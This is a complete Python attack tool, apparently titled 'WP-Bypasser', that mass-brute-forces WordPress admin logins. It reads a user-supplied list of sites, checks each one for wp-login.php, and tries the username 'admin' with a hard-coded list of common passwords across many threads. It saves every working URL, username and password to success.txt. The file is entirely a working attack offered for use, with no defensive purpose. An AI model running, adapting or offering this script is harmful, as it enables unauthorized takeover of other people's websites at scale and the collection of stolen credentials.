import requests
from multiprocessing.dummy import  Pool
from colorama import Fore
 
####Warna
fw = Fore.WHITE
fr = Fore.RED
fg = Fore.GREEN
 
header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
}
 
password = ['admin', '123456', 'pass', 'password', 'admin123', '12345', 'admin@123', '123', 'test', '123456789', '1234', '12345678', '123123', 'demo', 'blah', 'hello', '1234567890', 'zx321654xz', '1234567', 'adminadmin', 'xxx', 'ricsky789..', '1q2w3e4r', 'xmagico', 'admin1234', 'logitech', 'p@ssw0rd', 'a', 'test123', 'root', 'pass123', 'password1', 'qwerty', '111111', 'gimboroot', 'joomla', 'test1', 'opencart', 'changeme', 'temporal', '1qaz2wsx', 'zxx321654xxz', '1111', 'abc123', 'P@ssw0rd', '123321', 'admin1', 'password123', 'qwerty123', 'admin888', 'qwe123', 'admin01', 'admin12345', 'test1234', 'pass1234', '00', 'admin!@#', '112233', 'guest', 'q1w2e3r4']
 
def login(url):
	session = requests.Session()
	urllog = url+'/wp-login.php'
	try:
		for passwd in password:
			logdat = {'log': 'admin','pwd': passwd,'wp-submit': 'Log+In','redirect_to': url+'/wp-admin/','testcookie': 1}
			ceklog = session.post(urllog,data=logdat,timeout=10,allow_redirects=False,headers=header)
			cekadmin = session.get(url+'/wp-admin/',headers=header,cookies=ceklog.cookies.get_dict())
			if '?action=logout' in cekadmin.text:
				print(('{}Success LogIn >> {}'.format(fw, fg+url)))
				with open('success.txt', 'a') as f:
					f.write(urllog+'|admin|'+passwd+'\n')
					f.close()
				break
			else:
				print(('{}Failed LogIn >> {}'.format(fw, fr+url)))
	except Exception as e:
		print((str(e)))
 
def ceklog(url):
	if '://' in url:
		pass
	else:
		url = 'http://'+url
	try:
		cek = requests.get(url+'/wp-login.php',timeout=7,headers=header)
		if ('log' and 'pwd') in cek.text:
			print(('{}Wordpress Sites >> {}'.format(fg, url)))
			login(url)
		else:
			print(('{}Not Wordpress Sites >> {}'.format(fr, url)))
	except Exception as e:
		print((str(e)))



def Main():
	try:
		print("""
\033[34;1m__        ______       ____                                      
\ \      / /  _ \     | __ ) _   _ _ __   __ _ ___ ___  ___ _ __ 
 \ \ /\ / /| |_) |____|  _ \| | | | '_ \ / _` / __/ __|/ _ \ '__|
  \ V  V / |  __/_____| |_) | |_| | |_) | (_| \__ \__ \  __/ |   
   \_/\_/  |_|        |____/ \__, | .__/ \__,_|___/___/\___|_|   
                             |___/|_|                            
		\033[0m""")
		x = open(input('\033[32;1mYour List :\033[33;1m '), 'r')
		the = input('\033[32;1mThreads :\033[33;1m ')
		y = x.read().split('\n')
		pp = Pool(int(the))
		pp.map(ceklog, y)
	except IOError as e:
		print((str(e)))
 
if __name__ == '__main__':
	Main()
